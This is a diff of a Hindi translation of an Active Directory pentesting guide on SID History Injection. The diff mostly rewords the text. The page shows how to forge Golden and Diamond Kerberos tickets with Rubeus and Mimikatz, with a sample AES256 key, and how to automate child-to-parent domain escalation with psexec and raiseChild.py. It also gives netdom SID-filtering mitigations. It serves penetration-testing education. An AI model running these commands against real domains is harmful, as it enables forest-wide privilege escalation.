@@ -4,31 +4,31 @@
 
 ## SID History Injection Attack
 
-**SID History Injection Attack** का ध्यान **डोमेन के बीच उपयोगकर्ता माइग्रेशन** में मदद करना है, जबकि पूर्व डोमेन से संसाधनों तक निरंतर पहुंच सुनिश्चित करना है। यह **उपयोगकर्ता के पिछले सुरक्षा पहचानकर्ता (SID) को उनके नए खाते के SID इतिहास में शामिल करके** किया जाता है। विशेष रूप से, इस प्रक्रिया का दुरुपयोग करके उच्च-विशेषाधिकार समूह (जैसे Enterprise Admins या Domain Admins) के SID को माता-पिता डोमेन से SID इतिहास में जोड़कर अनधिकृत पहुंच प्रदान की जा सकती है। यह शोषण माता-पिता डोमेन के भीतर सभी संसाधनों तक पहुंच प्रदान करता है।
+**SID History Injection Attack** का ध्यान **डोमेन के बीच उपयोगकर्ता माइग्रेशन** में सहायता करना है, जबकि पूर्व डोमेन से संसाधनों तक निरंतर पहुंच सुनिश्चित करना है। यह **उपयोगकर्ता के पिछले सुरक्षा पहचानकर्ता (SID) को उनके नए खाते के SID इतिहास में शामिल करके** किया जाता है। विशेष रूप से, इस प्रक्रिया का दुरुपयोग करके उच्च-विशेषाधिकार समूह (जैसे Enterprise Admins या Domain Admins) के SID को माता-पिता डोमेन से SID इतिहास में जोड़कर अनधिकृत पहुंच प्रदान की जा सकती है। इस शोषण से माता-पिता डोमेन के भीतर सभी संसाधनों तक पहुंच मिलती है।
 
-इस हमले को निष्पादित करने के लिए दो तरीके हैं: या तो **Golden Ticket** या **Diamond Ticket** बनाने के माध्यम से।
+इस हमले को निष्पादित करने के लिए दो विधियाँ हैं: या तो **Golden Ticket** या **Diamond Ticket** के निर्माण के माध्यम से।
 
-**"Enterprise Admins"** समूह के लिए SID को पहचानने के लिए, सबसे पहले रूट डोमेन के SID को ढूंढना होगा। पहचान के बाद, Enterprise Admins समूह SID को रूट डोमेन के SID में `-519` जोड़कर बनाया जा सकता है। उदाहरण के लिए, यदि रूट डोमेन SID `S-1-5-21-280534878-1496970234-700767426` है, तो "Enterprise Admins" समूह के लिए परिणामस्वरूप SID `S-1-5-21-280534878-1496970234-700767426-519` होगा।
+**"Enterprise Admins"** समूह के लिए SID को पहचानने के लिए, सबसे पहले रूट डोमेन का SID ढूंढना होगा। पहचान के बाद, Enterprise Admins समूह SID को रूट डोमेन के SID में `-519` जोड़कर बनाया जा सकता है। उदाहरण के लिए, यदि रूट डोमेन SID `S-1-5-21-280534878-1496970234-700767426` है, तो "Enterprise Admins" समूह के लिए परिणामस्वरूप SID `S-1-5-21-280534878-1496970234-700767426-519` होगा।
 
 आप **Domain Admins** समूहों का भी उपयोग कर सकते हैं, जो **512** पर समाप्त होता है।
 
-दूसरे डोमेन के एक समूह (उदाहरण के लिए "Domain Admins") का SID खोजने का एक और तरीका है:
+दूसरे डोमेन के समूह (उदाहरण के लिए "Domain Admins") का SID खोजने का एक और तरीका है:
 ```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
 > [!WARNING]
 > ध्यान दें कि एक ट्रस्ट संबंध में SID इतिहास को अक्षम करना संभव है, जिससे यह हमला विफल हो जाएगा।
 
-[**docs**](https://technet.microsoft.com/library/cc835085.aspx) के अनुसार:
-- **नेटडॉम टूल का उपयोग करके फॉरेस्ट ट्रस्ट पर SIDHistory को अक्षम करना** (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
-- **नेटडॉम टूल का उपयोग करके बाहरी ट्रस्ट पर SID फ़िल्टर क्वारंटाइन लागू करना** (`netdom trust /domain: /quarantine:yes on the domain controller`)
-- **एकल फॉरेस्ट के भीतर डोमेन ट्रस्ट पर SID फ़िल्टरिंग लागू करना** अनुशंसित नहीं है क्योंकि यह एक असमर्थित कॉन्फ़िगरेशन है और इससे तोड़ने वाले परिवर्तन हो सकते हैं। यदि एक फॉरेस्ट के भीतर एक डोमेन अविश्वसनीय है, तो इसे फॉरेस्ट का सदस्य नहीं होना चाहिए। इस स्थिति में, पहले विश्वसनीय और अविश्वसनीय डोमेन को अलग-अलग फॉरेस्ट में विभाजित करना आवश्यक है जहां SID फ़िल्टरिंग को इंटरफॉरेस्ट ट्रस्ट पर लागू किया जा सके।
+According to the [**docs**](https://technet.microsoft.com/library/cc835085.aspx):
+- **फॉरेस्ट ट्रस्ट पर SIDHistory को अक्षम करना** netdom टूल का उपयोग करके (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+- **बाहरी ट्रस्ट पर SID फ़िल्टर क्वारंटाइन लागू करना** netdom टूल का उपयोग करके (`netdom trust /domain: /quarantine:yes on the domain controller`)
+- **एकल फॉरेस्ट के भीतर डोमेन ट्रस्ट पर SID फ़िल्टरिंग लागू करना** अनुशंसित नहीं है क्योंकि यह एक असमर्थित कॉन्फ़िगरेशन है और इससे तोड़फोड़ करने वाले परिवर्तन हो सकते हैं। यदि एक फॉरेस्ट के भीतर एक डोमेन अविश्वसनीय है, तो इसे फॉरेस्ट का सदस्य नहीं होना चाहिए। इस स्थिति में, पहले विश्वसनीय और अविश्वसनीय डोमेन को अलग-अलग फॉरेस्ट में विभाजित करना आवश्यक है जहां SID फ़िल्टरिंग को इंटरफॉरेस्ट ट्रस्ट पर लागू किया जा सके।
 
 इस बारे में अधिक जानकारी के लिए इस पोस्ट की जांच करें: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
-### डायमंड टिकट (Rubeus + KRBTGT-AES256)
+### Diamond Ticket (Rubeus + KRBTGT-AES256)
 
-अंतिम बार जब मैंने यह कोशिश की थी, तो मुझे आर्ग **`/ldap`** जोड़ने की आवश्यकता थी।
+अंतिम बार जब मैंने यह कोशिश की थी, तो मुझे arg **`/ldap`** जोड़ने की आवश्यकता थी।
 ```bash
 # Use the /sids param
 Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
@@ -44,7 +44,7 @@ execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domai
 
 # You can use "Administrator" as username or any other string
 ```
-### Golden Ticket (Mimikatz) with KRBTGT-AES256
+### Golden Ticket (Mimikatz) के साथ KRBTGT-AES256
 ```bash
 mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
 
@@ -63,12 +63,14 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 ```
 गोल्डन टिकट के बारे में अधिक जानकारी के लिए देखें:
 
+
 {{#ref}}
 golden-ticket.md
 {{#endref}}
 
 
 डायमंड टिकट के बारे में अधिक जानकारी के लिए देखें:
+
 
 {{#ref}}
 diamond-ticket.md
@@ -120,7 +122,7 @@ psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.1
 ```
 #### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-यह एक Impacket स्क्रिप्ट है जो **बच्चे से माता-पिता के डोमेन में वृद्धि को स्वचालित करेगी**। स्क्रिप्ट को आवश्यकता है:
+यह एक Impacket स्क्रिप्ट है जो **बच्चे से माता-पिता के डोमेन में वृद्धि करने की प्रक्रिया को स्वचालित करेगी**। स्क्रिप्ट को आवश्यकता है:
 
 - लक्षित डोमेन नियंत्रक
 - बच्चे के डोमेन में एक व्यवस्थापक उपयोगकर्ता के लिए क्रेडेंशियल्स
